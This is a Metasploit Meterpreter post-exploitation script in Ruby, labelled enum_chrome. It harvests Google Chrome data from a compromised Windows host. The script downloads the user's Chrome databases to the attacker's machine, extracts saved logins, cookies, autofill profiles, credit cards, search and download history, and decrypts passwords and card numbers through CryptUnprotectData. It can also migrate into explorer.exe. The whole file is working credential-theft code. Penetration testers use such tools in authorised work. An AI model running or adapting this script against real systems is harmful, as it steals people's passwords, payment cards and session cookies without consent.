##
# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
# If you'd like to improve this script, please try to port it as a post
# module instead. Thank you.
##


#
# Script to extract data from a chrome installation.
#
# Author: Sven Taute <sven dot taute at gmail com>
#

require 'sqlite3'
require 'yaml'

if client.platform !~ /win32/
  print_error("This version of Meterpreter is not supported with this Script!")
  raise Rex::Script::Completed
end
@host_info = client.sys.config.sysinfo
@chrome_files = [
  { :in_file => "Web Data", :sql => "select * from autofill;", :out_file => "autofill"},
  { :in_file => "Web Data", :sql => "SELECT username_value,origin_url,signon_realm FROM logins;", :out_file => "user_site"},
  { :in_file => "Web Data", :sql => "select * from autofill_profiles;", :out_file => "autofill_profiles"},
  { :in_file => "Web Data", :sql => "select * from credit_cards;", :out_file => "autofill_credit_cards", :encrypted_fields => ["card_number_encrypted"]},
  { :in_file => "Cookies", :sql => "select * from cookies;", :out_file => "cookies"},
  { :in_file => "History", :sql => "select * from urls;", :out_file => "url_history"},
  { :in_file => "History", :sql => "SELECT url FROM downloads;", :out_file => "download_history"},
  { :in_file => "History", :sql => "SELECT term FROM keyword_search_terms;", :out_file => "search_history"},
  { :in_file => "Login Data", :sql => "select * from logins;", :out_file => "logins", :encrypted_fields => ["password_value"]},
  { :in_file => "Bookmarks", :sql => nil, :out_file => "bookmarks.json"},
  { :in_file => "Preferences", :sql => nil, :out_file => "preferences.json"},
]
@migrate = false
@old_pid = nil
@output_format = []

opts = Rex::Parser::Arguments.new(
  "-h" => [ false, "Help menu" ],
  "-m" => [ false, "Migrate into explorer.exe"],
  "-f" => [ true, "Output format: j[son], y[aml], t[ext]. Defaults to json"]
)

opts.parse(args) { |opt, idx, val|
  case opt
  when "-m"
    @migrate = true
  when "-f"
    if val =~ /^j(son)?$/
      @output_format << "json"
    elsif val =~ /^y(aml)?$/
      @output_format << "yaml"
    elsif val =~ /^t(ext)?$/
      @output_format << "text"
    else
      print_error("unknown format '#{val}'.")
      raise Rex::Script::Completed
    end
  when "-h"
    print_line("")
    print_line("DESCRIPTION: Script for enumerating preferences and extracting")
    print_line("information from the Google Chrome Browser on a target system.")
    print_line("Decryption of creditcard information and passwords only supported")
    print_line("on 32bit Windows Operating Systems.")
    print_line("")
    print_line("USAGE: run enum_chrome [-m]")
    print_line(opts.usage)
    raise Rex::Script::Completed
  end
}

@output_format << "json" if @output_format.empty?
if @output_format.include?("json")
  begin
    require 'json'
  rescue LoadError
    print_error("JSON is not available.")
    @output_format.delete("json")
    if @output_format.empty?
      print_status("Falling back to raw text output.")
      @output_format << "text"
    end
  end
end
print_status("using output format(s): " + @output_format.join(", "))

def prepare_railgun
  rg = client.railgun
  if (!rg.get_dll('crypt32'))
    rg.add_dll('crypt32')
  end

  if (!rg.crypt32.functions["CryptUnprotectData"])
    rg.add_function("crypt32", "CryptUnprotectData", "BOOL", [
        ["PBLOB","pDataIn", "in"],
        ["PWCHAR", "szDataDescr", "out"],
        ["PBLOB", "pOptionalEntropy", "in"],
        ["PDWORD", "pvReserved", "in"],
        ["PBLOB", "pPromptStruct", "in"],
        ["DWORD", "dwFlags", "in"],
        ["PBLOB", "pDataOut", "out"]
      ])
  end
end

def decrypt_data(data)
  rg = client.railgun
  pid = client.sys.process.open.pid
  process = client.sys.process.open(pid, PROCESS_ALL_ACCESS)

  mem = process.memory.allocate(1024)
  process.memory.write(mem, data)

  addr = [mem].pack("V")
  len = [data.length].pack("V")
  ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
  len, addr = ret["pDataOut"].unpack("V2")
  return "" if len == 0
  decrypted = process.memory.read(addr, len)
end

def write_output(file, rows)
  if @output_format.include?("json")
    ::File.open(file + ".json", "w") { |f| f.write(JSON.pretty_generate(rows)) }
  end
  if @output_format.include?("yaml")
    ::File.open(file + ".yml", "w") { |f| f.write(JSON.pretty_generate(rows)) }
  end
  if @output_format.include?("text")
    ::File.open(file + ".txt", "w") do |f|
      f.write(rows.first.keys.join("\t") + "\n")
      f.write(rows.map { |e| e.values.map(&:inspect).join("\t") }.join("\n"))
    end
  end
end

def process_files(username)
  @chrome_files.each do |item|
    in_file = File.join(@log_dir, Rex::FileUtils.clean_path(username), item[:in_file])
    out_file = File.join(@log_dir, Rex::FileUtils.clean_path(username), item[:out_file])
    if item[:sql]
      db = SQLite3::Database.new(in_file)
      columns, *rows = db.execute2(item[:sql])
      db.close
      rows.map! do |row|
        res = Hash[*columns.zip(row).flatten]
        if item[:encrypted_fields] && !client.sys.config.is_system?
          if @host_info['Architecture'] !~ /x64/
            item[:encrypted_fields].each do |field|
              print_good("decrypting field '#{field}'...")
              res[field + "_decrypted"] = decrypt_data(res[field])
            end
          else
            print_error("Can not decrypt #{item[:out_file]}, decryption only supported in 32bit OS")
          end
        end
        res
      end
      if rows.length > 0
        print_status("writing output '#{item[:out_file]}'...")
        write_output(out_file, rows)
      else
        print_status("no '#{item[:out_file]}' data found in file '#{item[:in_file]}'")
      end
    else
      ::FileUtils.cp(in_file, out_file)
    end
  end
end

def extract_data(username)
  chrome_path = @profiles_path + "\\" + username + @data_path
  begin
    client.fs.file.stat(chrome_path)
  rescue
    print_status("no files found for user '#{username}'")
    return false
  end

  @chrome_files.map{ |e| e[:in_file] }.uniq.each do |f|
    remote_path = chrome_path + '\\' + f
    local_path = File.join(@log_dir, Rex::FileUtils.clean_path(username), f)
    print_status("downloading file #{f} to '#{local_path}'...")
    client.fs.file.download_file(local_path, remote_path)
  end
  return true
end

if @migrate
  current_pid = client.sys.process.open.pid
  target_pid = client.sys.process["explorer.exe"]
  if target_pid != current_pid
    @old_pid = current_pid
    print_status("current PID is #{current_pid}. migrating into explorer.exe, PID=#{target_pid}...")
    client.core.migrate(target_pid)
    print_status("done.")
  end
end

host = session.session_host
@log_dir = File.join(Msf::Config.log_directory, "scripts", "enum_chrome", Rex::FileUtils.clean_path(@host_info['Computer']), Time.now.strftime("%Y%m%d.%H%M"))
::FileUtils.mkdir_p(@log_dir)

sysdrive = client.sys.config.getenv('SYSTEMDRIVE')
os = @host_info['OS']
if os =~ /(Windows 7|2008|Vista)/
  @profiles_path = sysdrive + "\\Users\\"
  @data_path = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
elsif os =~ /(2000|NET|XP)/
  @profiles_path = sysdrive + "\\Documents and Settings\\"
  @data_path = "\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default"
end

usernames = []

uid = client.sys.config.getuid

if is_system?
  print_status "running as SYSTEM, extracting user list..."
  print_status "(decryption of passwords and credit card numbers will not be possible)"
  client.fs.dir.foreach(@profiles_path) do |u|
    usernames << u if u !~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/
  end
  print_status "users found: #{usernames.join(", ")}"
else
  print_status "running as user '#{uid}'..."
  usernames << client.sys.config.getenv('USERNAME')
  prepare_railgun
end

usernames.each do |u|
  print_status("extracting data for user '#{u}'...")
  success = extract_data(u)
  process_files(u) if success
end

if @migrate && @old_pid
  print_status("migrating back into PID=#{@old_pid}...")
  client.core.migrate(@old_pid)
  print_status("done.")
end

raise Rex::Script::Completed
